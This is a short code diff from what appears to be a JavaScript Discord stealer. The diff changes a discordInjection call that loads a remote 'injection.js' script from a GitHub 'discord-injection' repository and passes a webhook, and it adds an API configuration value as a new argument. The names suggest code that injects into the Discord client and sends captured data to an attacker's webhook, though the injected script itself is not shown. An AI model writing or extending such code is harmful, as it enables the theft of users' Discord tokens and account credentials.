@@ -21,7 +21,8 @@ async function aurita() {
         const tasks2 = [
             discordInjection(
                 "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js",
-                CONFIG.webhook
+                CONFIG.webhook,
+                CONFIG.API
             )
         ];
 
